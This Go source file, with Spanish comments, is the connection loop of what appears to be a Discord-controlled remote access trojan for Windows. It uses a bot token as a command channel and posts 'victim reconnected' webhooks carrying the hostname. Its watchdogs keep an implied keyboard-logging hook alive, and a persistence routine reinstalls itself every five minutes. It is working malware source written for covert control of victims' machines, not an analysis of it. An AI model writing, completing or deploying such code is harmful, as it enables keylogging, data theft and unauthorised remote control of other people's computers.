//go:build windows

package bot

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/commands"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

var (
	activeMu       sync.Mutex
	activeSession  *discordgo.Session
	closedCh       chan struct{}
	closedSignaled bool
	lastDisconnect time.Time

	// processStart marca el arranque del proceso para medir en el diario
	// cuánto tarda el agente en estar conectado tras la pantalla azul.
	processStart = time.Now()
)

// Start conecta discordgo, prepara el canal de sesión y bloquea hasta que la
// sesión cae o el contexto raíz se cancela.
// gatewayOpenLimit acota el handshake del gateway. Sin tope, un arranque con la
// pila de red a medio levantar deja la lectura del Hello colgada y con ella el
// agente entero: minutos de silencio que parecen un bot muerto.
const gatewayOpenLimit = 45 * time.Second

func Start(ctx context.Context) error {
	dg, err := discordgo.New("Bot " + config.BotToken)
	if err != nil {
		return fmt.Errorf("bot: nueva sesión: %w", err)
	}

	// El handshake del websocket no trae deadline por defecto; 15 s basta para
	// una red sana y evita quedarse esperando a una conexión medio abierta.
	dg.Dialer.HandshakeTimeout = 15 * time.Second
	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages
	dg.AddHandler(interactionHandler)

	openStart := time.Now()
	opened, openErr := openBounded(dg, gatewayOpenLimit)
	if !opened {
		// El intento quedó colgado. Se abandona la sesión sin llamar a Close:
		// Open retiene el mutex mientras está dentro y Close esperaría para
		// siempre. El socket lo cierra Discord al no recibir Identify.
		return fmt.Errorf("bot: apertura del gateway agotada tras %s", gatewayOpenLimit)
	}
	if openErr != nil {
		return fmt.Errorf("bot: Open: %w", openErr)
	}
	slog.Debug("bot: gateway abierto", "ms", time.Since(openStart).Milliseconds())
	defer func() {
		if cerr := dg.Close(); cerr != nil {
			_ = cerr
		}
	}()

	wasConnected := currentSession() != nil

	sessionStart := time.Now()
	session, err := ensureSession(dg)
	if err != nil {
		return err
	}
	slog.Debug("bot: sesión lista", "canal", session.ChannelID, "ms", time.Since(sessionStart).Milliseconds())

	// El panel va antes que el registro de comandos: si Discord limita esa
	// llamada, el operador ya ve el agente vivo en el canal.
	if err := sendPanel(dg, session); err != nil {
		slog.Debug("bot: panel no enviado", "err", err)
	}
	if err := registerCommands(dg); err != nil {
		slog.Debug("bot: registro de comandos falló", "err", err)
	}
	live := snapshotSession(session)
	slog.Info("bot: conectado", "canal", live.ChannelID, "ip", live.IP, "ms", time.Since(openStart).Milliseconds(),
		"desde_arranque_ms", time.Since(processStart).Milliseconds())

	// Latido en disco: una copia lanzada a mano que pierda el mutex consulta
	// este archivo para saber si la instancia en marcha está sana o colgada.
	if hbErr := win32.WriteHeartbeat(); hbErr != nil {
		slog.Debug("latido: no se pudo escribir", "err", hbErr)
	}

	activeMu.Lock()
	activeSession = dg
	closedCh = make(chan struct{})
	closedSignaled = false
	closed := closedCh
	activeMu.Unlock()

	if wasConnected {
		offline := "desconocido"
		activeMu.Lock()
		last := lastDisconnect
		activeMu.Unlock()
		if !last.IsZero() {
			offline = time.Since(last).Round(time.Second).String()
		}
		_ = util.PostWebhook("🟡 Víctima reconectada", 16776960, []util.EmbedField{
			{Name: "hostname", Value: session.Hostname, Inline: true},
			{Name: "sesion", Value: formatSessionName(session.SessionNum), Inline: true},
			{Name: "tiempo_offline", Value: offline, Inline: true},
		})
	}

	watchCtx, watchCancel := context.WithCancel(ctx)
	defer watchCancel()

	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		networkWatchdog(watchCtx, dg, closed)
	}()
	go func() {
		defer wg.Done()
		persistenceWatchdog(watchCtx)
	}()

	select {
	case <-ctx.Done():
		watchCancel()
		wg.Wait()
		return nil
	case <-closed:
		watchCancel()
		wg.Wait()
		return errors.New("bot: sesión cerrada, reconectando")
	}
}

// openBounded ejecuta dg.Open() con plazo. Devuelve opened=false si venció el
// plazo; en ese caso la sesión se abandona y el bucle de reconexión crea otra.
//
// No se puede llamar a dg.Close() para desbloquearlo: Open retiene el mutex de
// la sesión mientras está dentro, así que Close esperaría al mismo bloqueo.
func openBounded(dg *discordgo.Session, limit time.Duration) (bool, error) {
	done := make(chan error, 1)
	go func() {
		done <- dg.Open()
	}()

	timer := time.NewTimer(limit)
	defer timer.Stop()

	select {
	case err := <-done:
		return true, err
	case <-timer.C:
		return false, nil
	}
}

// ForceReconnect cierra la sesión activa y despierta a RunWithReconnect.
func ForceReconnect() {
	activeMu.Lock()
	session := activeSession
	closed := closedCh
	lastDisconnect = time.Now()
	if closed != nil && !closedSignaled {
		closedSignaled = true
		close(closed)
	}
	activeMu.Unlock()

	if session != nil {
		if err := session.Close(); err != nil {
			slog.Debug("bot: cierre forzado", "err", err)
		}
	}
}

// markDisconnected registra el instante de la caída para el embed amarillo.
func markDisconnected() {
	activeMu.Lock()
	lastDisconnect = time.Now()
	activeMu.Unlock()
}

func networkWatchdog(ctx context.Context, session *discordgo.Session, closed chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-closed:
			return
		case <-ticker.C:
			// El latido va aquí y no solo al conectar: la tarea SYSTEM lo usa
			// para saber si la instancia está sana. Sin refresco, a los tres
			// minutos la daba por colgada, la mataba y arrancaba otra — y con
			// ella se iba el hook del teclado y lo tecleado.
			if hbErr := win32.WriteHeartbeat(); hbErr != nil {
				slog.Debug("latido: no se pudo escribir", "err", hbErr)
			}

			if !util.IsOnline() {
				slog.Debug("watchdog: sin red, forzando reconexión")
				ForceReconnect()
				return
			}

			lastAck := session.LastHeartbeatAck
			if !lastAck.IsZero() && time.Since(lastAck) > 90*time.Second {
				slog.Debug("watchdog: heartbeat stale, forzando reconexión", "last_ack", lastAck)
				ForceReconnect()
				return
			}
		}
	}
}

func persistenceWatchdog(ctx context.Context) {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if err := commands.InstallAll(); err != nil {
				slog.Debug("watchdog: reinstalación parcial de persistencia", "err", err)
			}
		}
	}
}
